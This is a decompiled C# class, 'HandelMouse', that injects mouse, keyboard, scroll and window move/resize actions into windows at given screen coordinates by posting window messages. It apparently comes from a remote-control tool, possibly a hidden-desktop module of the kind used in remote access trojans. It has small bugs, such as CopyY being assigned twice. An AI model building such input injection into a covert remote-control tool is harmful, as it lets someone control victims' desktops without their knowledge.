using System;
using System.Drawing;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

// Token: 0x02000002 RID: 2
public class HandelMouse
{
	// Token: 0x06000001 RID: 1
	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

	// Token: 0x06000002 RID: 2
	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetProcAddress(IntPtr hProcess, [MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);

	// Token: 0x06000003 RID: 3
	[DllImport("kernel32", SetLastError = true)]
	private static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);

	// Token: 0x06000004 RID: 4
	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool PostMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);

	// Token: 0x06000005 RID: 5
	[DllImport("user32.dll", SetLastError = true)]
	public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);

	// Token: 0x06000006 RID: 6
	[DllImport("user32.dll")]
	public static extern int SendMessage(IntPtr hWnd, int Msg, IntPtr wParam, IntPtr lParam);

	// Token: 0x06000007 RID: 7
	[DllImport("user32.dll")]
	public static extern bool ShowWindow(IntPtr hWnd, [MarshalAs(UnmanagedType.I4)] int nCmdShow);

	// Token: 0x06000008 RID: 8
	[DllImport("user32.dll")]
	private static extern bool IsZoomed(IntPtr hWnd);

	// Token: 0x06000009 RID: 9
	[DllImport("user32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool GetWindowRect(IntPtr hWnd, out HandelMouse.RECT lpRect);

	// Token: 0x0600000A RID: 10
	[DllImport("user32.dll")]
	public static extern IntPtr WindowFromPoint(Point p);

	// Token: 0x0600000B RID: 11
	[DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
	public static extern IntPtr GetParent(IntPtr hWnd);

	// Token: 0x0600000C RID: 12 RVA: 0x00002050 File Offset: 0x00000250
	public static IntPtr CreateLParamFor_WM_KEYDOWN(ushort RepeatCount, byte ScanCode, bool IsExtendedKey, bool DownBefore)
	{
		return HandelMouse.KeysLParam(RepeatCount, ScanCode, IsExtendedKey, DownBefore, false);
	}

	// Token: 0x0600000D RID: 13 RVA: 0x0000206C File Offset: 0x0000026C
	public static IntPtr CreateLParamFor_WM_KEYUP(ushort RepeatCount, byte ScanCode, bool IsExtendedKey)
	{
		return HandelMouse.KeysLParam(RepeatCount, ScanCode, IsExtendedKey, true, true);
	}

	// Token: 0x0600000E RID: 14 RVA: 0x00002088 File Offset: 0x00000288
	public static int MakeLParam(int LoWord, int HiWord)
	{
		return HiWord << 16 | (LoWord & 65535);
	}

	// Token: 0x0600000F RID: 15 RVA: 0x000020A8 File Offset: 0x000002A8
	public static IntPtr KeysLParam(ushort RepeatCount, byte ScanCode, bool IsExtendedKey, bool DownBefore, bool State)
	{
		int num = (int)(RepeatCount | (ushort)(ScanCode << 16));
		if (IsExtendedKey)
		{
			num |= 65536;
		}
		if (DownBefore)
		{
			num |= 1073741824;
		}
		if (State)
		{
			num = (int)((long)num | -2147483648L);
		}
		return new IntPtr(num);
	}

	// Token: 0x06000010 RID: 16 RVA: 0x000020FC File Offset: 0x000002FC
	public static void MouseLeftDown(int x, int y)
	{
		IntPtr intPtr = HandelMouse.WindowFromPoint(new Point(x, y));
		HandelMouse.ActiveHandel = intPtr;
		HandelMouse.RECT rect;
		HandelMouse.GetWindowRect(intPtr, out rect);
		Point point = new Point(x - rect.Left, y - rect.Top);
		int num = HandelMouse.SendMessage(intPtr, 132, IntPtr.Zero, (IntPtr)HandelMouse.MakeLParam(x, y));
		IntPtr intPtr2 = HandelMouse.FindWindow("#32768", null);
		bool flag = num == 20;
		bool flag2 = flag;
		if (flag2)
		{
			HandelMouse.PostMessage(intPtr, 16U, IntPtr.Zero, IntPtr.Zero);
		}
		else
		{
			bool flag3 = num == 8;
			bool flag4 = flag3;
			if (flag4)
			{
				HandelMouse.ShowWindow(intPtr, 6);
			}
			else
			{
				bool flag5 = num == 9;
				bool flag6 = flag5;
				if (flag6)
				{
					bool flag7 = HandelMouse.IsZoomed(intPtr);
					bool flag8 = flag7;
					if (flag8)
					{
						HandelMouse.ShowWindow(HandelMouse.IsActiveintPtr, 9);
					}
					else
					{
						HandelMouse.ShowWindow(HandelMouse.IsActiveintPtr, 3);
					}
				}
				else
				{
					bool flag9 = intPtr2 != IntPtr.Zero;
					bool flag10 = flag9;
					if (flag10)
					{
						HandelMouse.Contex = intPtr2;
						IntPtr lParam = (IntPtr)HandelMouse.MakeLParam(x, y);
						HandelMouse.PostMessage(HandelMouse.Contex, 513U, new IntPtr(1), lParam);
						HandelMouse.RightClick = true;
					}
					else
					{
						bool flag11 = HandelMouse.GetParent(intPtr) == IntPtr.Zero && y - rect.Top < HandelMouse.TTTT;
						bool flag12 = flag11;
						if (flag12)
						{
							HandelMouse.IsActiveintPtr = intPtr;
							HandelMouse.PostMessage(intPtr, 513U, (IntPtr)1, (IntPtr)HandelMouse.MakeLParam(x - rect.Left, y - rect.Top));
							HandelMouse.CopyY = x;
							HandelMouse.CopyY = y;
							HandelMouse.MoveHandel = intPtr;
							HandelMouse.SetWindowPos(intPtr, new IntPtr(-2), 0, 0, 0, 0, 3U);
							HandelMouse.SetWindowPos(intPtr, new IntPtr(-1), 0, 0, 0, 0, 3U);
							HandelMouse.SetWindowPos(intPtr, new IntPtr(-2), 0, 0, 0, 0, 67U);
						}
						else
						{
							bool flag13 = HandelMouse.GetParent(intPtr) != IntPtr.Zero || point.X <= rect.Right - rect.Left - 10 || point.Y <= rect.Bottom - rect.Top - 10;
							bool flag14 = flag13;
							if (flag14)
							{
								HandelMouse.PostMessage(intPtr, 513U, (IntPtr)1, (IntPtr)HandelMouse.MakeLParam(x - rect.Left, y - rect.Top));
							}
							else
							{
								HandelMouse.Xwidth = x;
								HandelMouse.Yheight = y;
								HandelMouse.ResizeHandel = intPtr;
							}
						}
					}
				}
			}
		}
	}

	// Token: 0x06000011 RID: 17 RVA: 0x0000239C File Offset: 0x0000059C
	public static void MouseLeftUp(int x, int y)
	{
		IntPtr hWnd = HandelMouse.WindowFromPoint(new Point(x, y));
		HandelMouse.RECT rect;
		HandelMouse.GetWindowRect(hWnd, out rect);
		bool rightClick = HandelMouse.RightClick;
		bool flag = rightClick;
		if (flag)
		{
			HandelMouse.PostMessage(HandelMouse.Contex, 514U, new IntPtr(1), (IntPtr)HandelMouse.MakeLParam(x, y));
			HandelMouse.RightClick = false;
			HandelMouse.Contex = IntPtr.Zero;
		}
		else
		{
			bool flag2 = HandelMouse.MoveHandel != IntPtr.Zero;
			bool flag3 = flag2;
			if (flag3)
			{
				HandelMouse.CopyX = 0;
				HandelMouse.CopyY = 0;
				HandelMouse.MoveHandel = IntPtr.Zero;
			}
			else
			{
				bool flag4 = !(HandelMouse.Xwidth > 0 | HandelMouse.Yheight > 0);
				bool flag5 = flag4;
				if (flag5)
				{
					HandelMouse.PostMessage(hWnd, 514U, (IntPtr)0, (IntPtr)HandelMouse.MakeLParam(x - rect.Left, y - rect.Top));
				}
				else
				{
					HandelMouse.RECT rect2;
					HandelMouse.GetWindowRect(HandelMouse.ResizeHandel, out rect2);
					int num = x - HandelMouse.Xwidth;
					int num2 = y - HandelMouse.Yheight;
					int cx = rect2.Right - rect2.Left + num;
					HandelMouse.SetWindowPos(HandelMouse.ResizeHandel, new IntPtr(0), rect2.Left, rect2.Top, cx, rect2.Bottom - rect2.Top + num2, 64U);
					HandelMouse.Xwidth = 0;
					HandelMouse.Yheight = 0;
					HandelMouse.ResizeHandel = IntPtr.Zero;
				}
			}
		}
	}

	// Token: 0x06000012 RID: 18 RVA: 0x00002510 File Offset: 0x00000710
	public static void MouseRightDown(int x, int y)
	{
		IntPtr hWnd = HandelMouse.WindowFromPoint(new Point(x, y));
		HandelMouse.RECT rect;
		HandelMouse.GetWindowRect(hWnd, out rect);
		IntPtr intPtr = HandelMouse.WindowFromPoint(new Point(x, y));
		HandelMouse.ActiveHandel = intPtr;
		HandelMouse.PostMessage(intPtr, 516U, (IntPtr)0, (IntPtr)HandelMouse.MakeLParam(x - rect.Left, y - rect.Top));
	}

	// Token: 0x06000013 RID: 19 RVA: 0x00002574 File Offset: 0x00000774
	public static void MouseRghitUp(int x, int y)
	{
		IntPtr hWnd = HandelMouse.WindowFromPoint(new Point(x, y));
		HandelMouse.RECT rect;
		HandelMouse.GetWindowRect(hWnd, out rect);
		HandelMouse.PostMessage(HandelMouse.WindowFromPoint(new Point(x, y)), 517U, (IntPtr)0, (IntPtr)HandelMouse.MakeLParam(x - rect.Left, y - rect.Top));
	}

	// Token: 0x06000014 RID: 20 RVA: 0x000025D0 File Offset: 0x000007D0
	public static void MouseDuoblClieck(int x, int y)
	{
		IntPtr hWnd = HandelMouse.WindowFromPoint(new Point(x, y));
		HandelMouse.RECT rect;
		HandelMouse.GetWindowRect(hWnd, out rect);
		IntPtr intPtr = HandelMouse.WindowFromPoint(new Point(x, y));
		HandelMouse.ActiveHandel = intPtr;
		HandelMouse.PostMessage(intPtr, 515U, (IntPtr)0, (IntPtr)HandelMouse.MakeLParam(x - rect.Left, y - rect.Top));
	}

	// Token: 0x06000015 RID: 21 RVA: 0x00002634 File Offset: 0x00000834
	public static void MouseMove(int x, int y)
	{
		IntPtr hWnd = HandelMouse.WindowFromPoint(new Point(x, y));
		HandelMouse.RECT rect;
		HandelMouse.GetWindowRect(hWnd, out rect);
		bool flag = HandelMouse.MoveHandel != IntPtr.Zero;
		bool flag2 = flag;
		if (flag2)
		{
			HandelMouse.PostMessage(HandelMouse.MoveHandel, 514U, (IntPtr)0, (IntPtr)HandelMouse.MakeLParam(x - rect.Left, y - rect.Top));
			HandelMouse.RECT rect2;
			HandelMouse.GetWindowRect(HandelMouse.MoveHandel, out rect2);
			int num = rect2.Right - rect2.Left;
			int cy = rect2.Bottom - rect2.Top;
			HandelMouse.SetWindowPos(HandelMouse.MoveHandel, new IntPtr(0), x - num / 2, y, num, cy, 64U);
			HandelMouse.CopyX = x;
			HandelMouse.CopyY = y;
		}
		else
		{
			IntPtr hWnd2 = HandelMouse.WindowFromPoint(new Point(x, y));
			HandelMouse.RECT rect3;
			HandelMouse.GetWindowRect(hWnd2, out rect3);
			HandelMouse.PostMessage(hWnd2, 512U, (IntPtr)0, (IntPtr)HandelMouse.MakeLParam(x - rect3.Left, y - rect3.Top));
		}
	}

	// Token: 0x06000016 RID: 22 RVA: 0x00002748 File Offset: 0x00000948
	public static void KeyboardDown(string k)
	{
		int num = Strings.AscW(k);
		bool flag = num == 8 | num == 13;
		bool flag2 = flag;
		if (flag2)
		{
			HandelMouse.PostMessage(HandelMouse.ActiveHandel, 256U, (IntPtr)Conversions.ToInteger("&H" + Conversion.Hex(Strings.AscW(k))), HandelMouse.CreateLParamFor_WM_KEYDOWN(1, 30, false, false));
			HandelMouse.PostMessage(HandelMouse.ActiveHandel, 257U, (IntPtr)Conversions.ToInteger("&H" + Conversion.Hex(Strings.AscW(k))), HandelMouse.CreateLParamFor_WM_KEYUP(1, 30, false));
		}
		else
		{
			HandelMouse.PostMessage(HandelMouse.ActiveHandel, 258U, (IntPtr)Strings.AscW(k), (IntPtr)1);
		}
	}

	// Token: 0x06000017 RID: 23 RVA: 0x00002808 File Offset: 0x00000A08
	public static void ScrollDown()
	{
		IntPtr activeHandel = HandelMouse.ActiveHandel;
		bool flag = activeHandel != IntPtr.Zero;
		if (flag)
		{
			HandelMouse.SendMessage(activeHandel, 277, new IntPtr(1), IntPtr.Zero);
		}
	}

	// Token: 0x06000018 RID: 24 RVA: 0x00002844 File Offset: 0x00000A44
	public static void ScrollUp()
	{
		IntPtr activeHandel = HandelMouse.ActiveHandel;
		bool flag = activeHandel != IntPtr.Zero;
		if (flag)
		{
			HandelMouse.SendMessage(activeHandel, 277, new IntPtr(0), IntPtr.Zero);
		}
	}

	// Token: 0x06000019 RID: 25 RVA: 0x0000287E File Offset: 0x00000A7E
	public static void CloseWindow()
	{
		HandelMouse.SendMessage(HandelMouse.IsActiveintPtr, 16, (IntPtr)0, (IntPtr)0);
	}

	// Token: 0x0600001A RID: 26 RVA: 0x0000289C File Offset: 0x00000A9C
	public static void MinTop()
	{
		IntPtr isActiveintPtr = HandelMouse.IsActiveintPtr;
		HandelMouse.ShowWindow(isActiveintPtr, 6);
	}

	// Token: 0x0600001B RID: 27 RVA: 0x000028B8 File Offset: 0x00000AB8
	public static void RestoreMaxTop()
	{
		IntPtr isActiveintPtr = HandelMouse.IsActiveintPtr;
		bool flag = HandelMouse.IsZoomed(isActiveintPtr);
		if (flag)
		{
			HandelMouse.ShowWindow(isActiveintPtr, 9);
		}
		else
		{
			HandelMouse.ShowWindow(isActiveintPtr, 3);
		}
	}

	// Token: 0x04000001 RID: 1
	public const int TitleHandel1 = 2;

	// Token: 0x04000002 RID: 2
	public const int TitleHandel2 = 12;

	// Token: 0x04000003 RID: 3
	public const int IsCloseHandel = 20;

	// Token: 0x04000004 RID: 4
	public const int CloseHandel = 16;

	// Token: 0x04000005 RID: 5
	public const int SetHandelValue = 132;

	// Token: 0x04000006 RID: 6
	public const int IsHideHandel = 8;

	// Token: 0x04000007 RID: 7
	public const int IsShowHandel = 9;

	// Token: 0x04000008 RID: 8
	public static IntPtr ActiveHandel;

	// Token: 0x04000009 RID: 9
	private static IntPtr IsActiveintPtr;

	// Token: 0x0400000A RID: 10
	private static IntPtr MoveHandel;

	// Token: 0x0400000B RID: 11
	private static IntPtr ResizeHandel;

	// Token: 0x0400000C RID: 12
	private static IntPtr Contex;

	// Token: 0x0400000D RID: 13
	public static int CopyX;

	// Token: 0x0400000E RID: 14
	public static int CopyY;

	// Token: 0x0400000F RID: 15
	private static int Xwidth;

	// Token: 0x04000010 RID: 16
	private static int Yheight;

	// Token: 0x04000011 RID: 17
	private static bool RightClick;

	// Token: 0x04000012 RID: 18
	public static int TTTT;

	// Token: 0x04000013 RID: 19
	public static bool IsMovemouse;

	// Token: 0x02000013 RID: 19
	public struct RECT
	{
		// Token: 0x04000044 RID: 68
		public int Left;

		// Token: 0x04000045 RID: 69
		public int Top;

		// Token: 0x04000046 RID: 70
		public int Right;

		// Token: 0x04000047 RID: 71
		public int Bottom;
	}
}
